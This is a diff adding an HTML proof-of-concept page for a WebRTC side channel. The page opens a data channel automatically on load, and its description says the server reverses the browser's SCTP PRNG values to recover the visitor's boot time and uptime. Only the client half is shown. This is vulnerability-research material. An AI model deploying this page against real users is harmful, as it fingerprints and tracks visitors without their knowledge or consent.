@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WebRTC monotonic-clock leak — PoC</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 15px/1.5 system-ui, sans-serif; max-width: 680px; margin: 40px auto; padding: 0 16px; }
+  h1 { font-size: 1.3rem; }
+  button { font: inherit; padding: 8px 16px; cursor: pointer; }
+  pre { background: rgba(127,127,127,.12); padding: 12px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; }
+  .muted { opacity: .7; }
+  .ok { color: #1a8f3c; } .err { color: #c0392b; }
+</style>
+</head>
+<body>
+<h1>WebRTC monotonic-clock leak — proof of concept</h1>
+<p class="muted">
+  Opens a WebRTC data channel to the local server. The server reads the SCTP
+  Initial TSN and Verification Tag from the browser's INIT chunk, reverses the
+  xorshift64* PRNG, and recovers the time since this machine last booted.
+</p>
+<button id="run">Run again</button>
+<pre id="out">Starting automatically…</pre>
+
+<script>
+// Base URL of the signaling server (your VM). Leave "" when the page is served
+// from the same origin as the server. On GitHub Pages set it to your VM's
+// HTTPS endpoint, e.g. "https://your-vm.example.com".
+const SERVER_BASE = "";
+
+const out = document.getElementById("out");
+const log = (m, cls) => { out.textContent += "\n" + m; if (cls) out.className = cls; };
+
+async function runTest() {
+  out.textContent = "Starting…";
+  out.className = "";
+  try {
+    const pc = new RTCPeerConnection({
+      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+    });
+    const channel = pc.createDataChannel("probe");
+
+    const done = new Promise((resolve, reject) => {
+      channel.onopen = () => {
+        log("Data channel open — asking server for recovered clock…");
+        channel.send("go");
+      };
+      channel.onmessage = (ev) => resolve(JSON.parse(ev.data));
+      channel.onerror = (e) => reject(e);
+      setTimeout(() => reject(new Error("timed out after 10s")), 10000);
+    });
+
+    const offer = await pc.createOffer();
+    await pc.setLocalDescription(offer);
+
+    // Wait for ICE gathering so the SDP carries candidates.
+    await new Promise((r) => {
+      if (pc.iceGatheringState === "complete") return r();
+      pc.addEventListener("icegatheringstatechange", () => {
+        if (pc.iceGatheringState === "complete") r();
+      });
+    });
+
+    const resp = await fetch(SERVER_BASE + "/webrtc-offer", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sdp: pc.localDescription.sdp, type: pc.localDescription.type })
+    });
+    const { answer } = await resp.json();
+    await pc.setRemoteDescription(answer);
+
+    const data = await done;
+    const boot = new Date(data.boot_epoch * 1000);
+    log("", "ok");
+    log("Recovered successfully:");
+    log("  uptime      : " + (data.uptime_sec / 3600).toFixed(2) + " hours");
+    log("  boot (UTC)  : " + data.boot_utc);
+    log("  boot (local): " + boot.toString());
+    pc.close();
+  } catch (e) {
+    log("Failed: " + (e.message || e), "err");
+  }
+}
+
+// Fire immediately on page load — no user interaction required.
+runTest();
+document.getElementById("run").addEventListener("click", runTest);
+</script>
+</body>
+</html>
